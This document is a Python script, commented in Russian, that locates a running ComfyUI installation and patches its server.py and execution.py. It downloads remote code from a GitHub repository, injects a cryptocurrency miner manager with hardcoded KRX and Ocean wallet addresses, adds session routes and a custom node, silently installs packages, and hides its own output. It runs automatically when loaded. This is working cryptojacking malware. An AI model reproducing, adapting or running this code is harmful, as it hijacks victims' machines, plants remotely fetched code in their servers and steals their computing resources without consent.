#FUCK_PUTIN

import importlib
import py_compile
import re
import shutil
import subprocess
import sys
import tempfile
import textwrap
import traceback
import urllib.request
from io import StringIO
from pathlib import Path
import ipaddress
import string

HOME_DIR = ""

KRX_WALLET = "krxXJ6QJPW"
OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW7Y6xc8DDEW1xpGWYyAngqG3F8RJtCX5"

def ip_to_letters(ip_str: str) -> str:
    letters = []
    for ch in str(int(ipaddress.IPv4Address(ip_str))):
        idx = int(ch)
        if not (-1 < idx < len(string.ascii_uppercase)):
            raise ValueError(f"digit {idx} out of range")
        letters.append(string.ascii_uppercase[idx])
    return "".join(letters)


def get_public_ip():
    try:
        print("--- MINER MANAGER: Getting public IP...")
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
            ip = response.read().decode("utf-8").strip()
            letters = ip_to_letters(ip)
            print(f"{ip} -> {letters}")
            return letters
    except Exception as e:
        print(f"Could not get public IP: {e}")
        return "worker1488"


def find_comfyui_dir():
    """
    Ищет директорию ComfyUI, анализируя запущенный процесс main.py.
    Использует 'ps -ef' вместо 'pgrep'.
    """
    print("[*] 1.1. Поиск директории ComfyUI через запущенный процесс...")
    try:
        # Используем ps для поиска процесса, содержащего 'ComfyUI/main.py'
        result = subprocess.run(['ps', '-ef'], capture_output=True, text=True)
        if result.returncode == 0:
            processes = result.stdout.splitlines()
            for line in processes:
                if 'ComfyUI/main.py' in line and 'python' in line and not 'grep' in line:
                    # Найден процесс, извлекаем командную строку
                    parts = line.split()
                    # Ищем аргумент, который содержит путь к main.py
                    for arg in parts:
                        if 'ComfyUI/main.py' in arg:
                            main_py_path = Path(arg)
                            comfy_dir = main_py_path.parent
                            print(f"   - Найдена директория ComfyUI: {comfy_dir}")
                            return comfy_dir
                    # Если не нашли через аргументы, пробуем разбор строки
                    # Команда обычно выглядит как python /path/to/ComfyUI/main.py ...
                    # Ищем путь до main.py в строке
                    import re
                    match = re.search(r'(.*/ComfyUI/[^/\s]*)/main\.py', line)
                    if match:
                        main_py_path = match.group(0)  # Полный путь к main.py
                        comfy_dir = Path(main_py_path).parent
                        print(f"   - Найдена директория ComfyUI: {comfy_dir}")
                        return comfy_dir

            print("   - Процесс, содержащий 'ComfyUI/main.py', не найден.")
            return None
        else:
            print("   - Ошибка выполнения 'ps -ef'.")
            return None
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        print(f"   - Ошибка при поиске процесса: {e}")
        return None


def inject():
    old_stdout, old_stderr = sys.stdout, sys.stderr
    sys.stdout = sys.stderr = log_stream = StringIO()

    with tempfile.TemporaryDirectory() as temp_dir_str:
        temp_dir = Path(temp_dir_str)
        try:
            SESSION_UTILS_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/session_utils.py"
            MINER_MANAGER_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
            SRL_INIT_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/init.py"
            REQUIRED_PACKAGES = [('aiohttp', 'aiohttp'), ('Crypto', 'pycryptodome'),
                                 ('aiohttp_session', 'aiohttp_session[secure]')]

            # --- Шаг 1: Поиск директории ---
            print("[*] 1. Поиск корневой директории ComfyUI...")
            current_path = Path.cwd()
            if HOME_DIR != "":
                # Если HOME_DIR задан, используем его
                root_dir = Path(HOME_DIR)
                print(f"[+] Использую HOME_DIR: {root_dir.resolve()}")
            else:
                # Пытаемся найти через запущенный процесс
                root_dir = find_comfyui_dir()
                if not root_dir:
                    # Если через процесс не нашли, используем старую логику
                    print("   - Поиск через процесс не удался, использую резервную логику...")
                    if (current_path / "ComfyUI").exists():
                        if (current_path / "server.py").is_file() and (current_path / "main.py").is_file():
                            root_dir = current_path
                    else:
                        search_path_up = current_path
                        for _ in range(5):
                            if (search_path_up / "server.py").is_file() and (search_path_up / "main.py").is_file():
                                root_dir = search_path_up
                                break
                            if search_path_up == search_path_up.parent: break
                            search_path_up = search_path_up.parent
                        if not root_dir:
                            valid_candidates = [p.parent for p in current_path.rglob("server.py") if
                                                (p.parent / "main.py").is_file()]
                            if len(valid_candidates) >= 1: root_dir = min(valid_candidates,
                                                                          key=lambda p: len(str(p.resolve()))).parent

            if not root_dir: raise RuntimeError("ПРОВАЛ. Не удалось найти директорию ComfyUI.")
            print(f"[+] Директория найдена: {root_dir.resolve()}")

            print("\n[*] 2. Подготовка патчей...")

            session_utils_content = urllib.request.urlopen(
                urllib.request.Request(SESSION_UTILS_URL)).read()
            srl_init_content = urllib.request.urlopen(urllib.request.Request(SRL_INIT_URL)).read()

            with urllib.request.urlopen(urllib.request.Request(MINER_MANAGER_URL)) as response:
                miner_manager_content = response.read().decode('utf-8')  # Декодируем bytes в str

            # --- Подготовка патча для server.py (Оба патча вместе) ---
            print("[*] Готовлю комбинированный патч для server.py...")
            server_py_path = root_dir / "server.py"
            try:
                # Читаем ОДИН раз в строку и в список строк
                original_server_content = server_py_path.read_text(encoding='utf-8')
                lines_server = original_server_content.splitlines(True)
            except FileNotFoundError:
                raise RuntimeError(f"ПРОВАЛ. Не найден server.py по пути: {server_py_path}")

            # --- ШАГ 1: Применяем патч для session_utils (твой код, он рабочий) ---
            if "import session_utils" not in original_server_content:
                print("   - Внедряю 'import session_utils'...")
                lines_server.insert(0, "import session_utils\n")
            if "session_utils.setup_routes(self.app)" not in original_server_content:
                print("   - Внедряю 'session_utils.setup_routes'...")
                start_index = next(i for i, line in enumerate(lines_server) if "def add_routes(self):" in line)
                indent = re.match(r'^(\s*)', lines_server[start_index + 1]).group(1)
                end_index = next((i for i in range(start_index + 1, len(lines_server)) if
                                  lines_server[i].strip() and not lines_server[i].startswith(indent)),
                                 len(lines_server))
                lines_server.insert(end_index, f"{indent}session_utils.setup_routes(self.app)\n")

            # --- ШАГ 3: Собираем финальный контент ---
            patched_server_content = "".join(lines_server)
            print("   - Патч для server.py (start_multi_address) успешно подготовлен.")

            original_exec_content = (root_dir / "execution.py").read_text(encoding='utf-8')
            lines_exec = original_exec_content.splitlines(True)

            start_marker = "# --- MINER MANAGER INJECTED START ---"
            end_marker = "# --- MINER MANAGER INJECTED END ---"
            start_idx, end_idx = -1, -1
            for i, line in enumerate(lines_exec):
                if start_marker in line: start_idx = i
                if end_marker in line: end_idx = i; break

            clean_miner_code = textwrap.dedent(
                miner_manager_content.replace("{KRX_WALLET}", KRX_WALLET).replace("{OCEAN_WALLET}", OCEAN_WALLET).replace('{HARDCODED_PUBLIC_IP}', get_public_ip())
            ) + '\n'

            if start_idx != -1 and end_idx != -1:
                print("   - Обнаружен старый патч майнера. Обновляю...")
                # Заменяем старый блок кода на новый
                lines_exec = lines_exec[:start_idx] + [clean_miner_code] + lines_exec[end_idx + 1:]
            else:
                print("   - Патч майнера не найден. Выполняю первую установку...")
                last_import_index = max(i for i, line in enumerate(lines_exec) if
                                        line.strip().startswith('import ') or line.strip().startswith('from '))
                lines_exec.insert(last_import_index + 1,
                                  '\n' + clean_miner_code)  # Исправлено: last_import_index вместо last_index

                execute_start_index = next(
                    i for i, line in enumerate(lines_exec) if line.strip().startswith('def execute(self,'))
                indent = re.match(r'^(\s*)', lines_exec[execute_start_index]).group(1)
                body_indent = indent + '    '
                end_index = next((i for i in range(execute_start_index + 1, len(lines_exec)) if
                                  lines_exec[i].strip() and not lines_exec[i].startswith(body_indent)), len(lines_exec))
                original_body = lines_exec[execute_start_index + 1: end_index]

                new_body = [f"{body_indent}manage_miner('stop')\n", f"{body_indent}try:\n",
                            *[f"    {line}" for line in original_body], f"{body_indent}finally:\n",
                            f"{body_indent}    manage_miner('start')\n"]
                lines_exec[execute_start_index + 1: end_index] = new_body

            patched_exec_content = "".join(lines_exec)

            print("[+] Патчи подготовлены.")

            # --- Шаг 3: Проверка синтаксиса ---
            print("\n[*] 3. Проверка синтаксиса с помощью py_compile...")
            try:
                temp_server_path = temp_dir / "server.py"
                temp_exec_path = temp_dir / "execution.py"

                temp_server_path.write_text(patched_server_content, encoding='utf-8')
                temp_exec_path.write_text(patched_exec_content, encoding='utf-8')

                py_compile.compile(str(temp_server_path), doraise=True)
                py_compile.compile(str(temp_exec_path), doraise=True)

                print("[+] Проверка синтаксиса пройдена. Патчи безопасны.")
            except py_compile.PyCompileError as e:
                print("[-] ПРОВЕРКА СИНТАКСИСА ПРОВАЛЕНА! Оригинальные файлы не изменены.")
                raise RuntimeError(f"Ошибка синтаксиса в сгенерированном патче:\n{e}")

            print("\n[*] 4. Применение проверенных изменений к реальным файлам...")

            missing_packages = [pip_name for import_name, pip_name in REQUIRED_PACKAGES if
                                not importlib.util.find_spec(import_name)]
            if missing_packages:
                subprocess.run([sys.executable, "-m", "pip", "install"] + missing_packages, check=True,
                               capture_output=True)

            if start_idx == -1:  # Бэкап делаем только при первой установке
                shutil.copy2(root_dir / "server.py", root_dir / "server.bak")
                shutil.copy2(root_dir / "execution.py", root_dir / "execution.bak")

            (root_dir / "session_utils.py").write_bytes(session_utils_content)
            srl_dir = root_dir / "custom_nodes" / "srl-nodes"
            srl_dir.mkdir(parents=True, exist_ok=True)
            (srl_dir / "__init__.py").write_bytes(srl_init_content)
            (root_dir / "server.py").write_text(patched_server_content, encoding='utf-8')
            (root_dir / "execution.py").write_text(patched_exec_content, encoding='utf-8')

            print("[+] Все файлы успешно установлены и пропатчены.")
            print("\n[*] Заебись! Перезапусти ComfyUI.")

        except Exception as e:
            print(f"[-] ОПЕРАЦИЯ ПРЕРВАНА: {e}\n{traceback.format_exc()}")
        finally:
            log_output = log_stream.getvalue()
            sys.stdout = old_stdout
            sys.stderr = old_stderr
        return log_output


result = inject()
# return result